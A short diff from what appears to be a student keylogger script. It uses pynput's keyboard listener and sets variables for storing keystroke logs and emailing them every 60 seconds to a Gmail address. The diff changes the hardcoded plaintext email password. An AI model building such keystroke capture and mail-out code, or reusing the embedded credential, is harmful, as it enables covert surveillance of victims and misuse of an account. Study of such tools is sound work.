@@ -7,7 +7,7 @@ from pynput.keyboard import Key, Listener
 log_data = ""  # String builder for storing logs
 email_interval = 60  # Time in seconds to send logs
 email_address = "practice.email.cs450@gmail.com"
-email_password = "unbxgvmxomojirbh"
+email_password = "dimeqmbctsigedfh"
 recipient_email = "practice.email.cs450@gmail.com"
 
 
